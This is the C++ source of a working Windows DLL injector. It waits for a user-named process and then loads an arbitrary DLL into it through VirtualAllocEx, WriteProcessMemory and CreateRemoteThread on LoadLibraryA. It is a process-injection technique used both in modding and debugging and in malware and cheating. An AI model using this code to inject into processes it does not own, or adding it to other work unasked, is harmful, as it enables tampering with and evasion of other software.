#include <iostream>
#include <windows.h>
#include <thread>
#include <tlhelp32.h>
#include <string>

// Convert std::string to std::wstring
std::wstring StringToWString(const std::string& str) {
    return std::wstring(str.begin(), str.end());
}

// Function to inject a DLL into a process
bool InjectDLL(const std::string& processName, const std::string& dllPath) {
    // Validate DLL path
    if (INVALID_FILE_ATTRIBUTES == GetFileAttributesA(dllPath.c_str()) && GetLastError() == ERROR_FILE_NOT_FOUND) {
        std::cerr << "DLL not found at path: " << dllPath << std::endl;
        return false;
    }

    // Find the target process
    DWORD processID = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to take a snapshot of processes." << std::endl;
        return false;
    }

    PROCESSENTRY32W processEntry = {};
    processEntry.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(snapshot, &processEntry)) {
        do {
            if (StringToWString(processName) == processEntry.szExeFile) {
                processID = processEntry.th32ProcessID;
                break;
            }
        } while (Process32NextW(snapshot, &processEntry));
    }

    CloseHandle(snapshot);

    if (processID == 0) {
        std::cerr << "Process not found: " << processName << std::endl;
        return false;
    }

    // Open the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (!hProcess) {
        std::cerr << "Failed to open target process. Error: " << GetLastError() << std::endl;
        return false;
    }

    // Allocate memory in the target process for the DLL path
    void* pRemoteMemory = VirtualAllocEx(hProcess, nullptr, dllPath.size() + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteMemory) {
        std::cerr << "Failed to allocate memory in target process. Error: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    // Write the DLL path into the allocated memory
    if (!WriteProcessMemory(hProcess, pRemoteMemory, dllPath.c_str(), dllPath.size() + 1, nullptr)) {
        std::cerr << "Failed to write DLL path into target process. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // Get the address of LoadLibraryA
    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
    if (!hKernel32) {
        std::cerr << "Failed to get handle to kernel32.dll. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    FARPROC pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");
    if (!pLoadLibrary) {
        std::cerr << "Failed to get address of LoadLibraryA. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    // Create a remote thread to execute LoadLibraryA with the DLL path
    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, pRemoteMemory, 0, nullptr);
    if (!hThread) {
        std::cerr << "Failed to create remote thread in target process. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    WaitForSingleObject(hThread, INFINITE);

    // Clean up
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    std::cout << "DLL successfully injected into process: " << processName << " (PID: " << processID << ")" << std::endl;
    return true;
}

int main() {
    std::cout << "Please paste in the name of your executable file.\n";
    std::string nameProcess;
    std::cin >> nameProcess;
    const std::string processName = nameProcess;

    std::cout << "Please paste in the path to the DLL you want to inject.\n";
    std::string pathDll;
    std::cin >> pathDll;
    const std::string dllPath = pathDll;

    while (true) {
        // Check if the process is running
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot == INVALID_HANDLE_VALUE) {
            std::cerr << "Failed to take a snapshot of processes." << std::endl;
            std::this_thread::sleep_for(std::chrono::seconds(1));
            continue;
        }

        PROCESSENTRY32W processEntry = {};
        processEntry.dwSize = sizeof(PROCESSENTRY32W);
        bool processFound = false;

        if (Process32FirstW(snapshot, &processEntry)) {
            do {
                if (StringToWString(processName) == processEntry.szExeFile) {
                    processFound = true;
                    break;
                }
            } while (Process32NextW(snapshot, &processEntry));
        }

        CloseHandle(snapshot);

        if (processFound) {
            std::cout << "Process found: " << processName << ". Waiting 15 seconds before injecting..." << std::endl;
            std::this_thread::sleep_for(std::chrono::seconds(15));

            if (!InjectDLL(processName, dllPath)) {
                std::cerr << "Injection failed." << std::endl;
            }
        }
        else {
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
    }

    return 0;
}
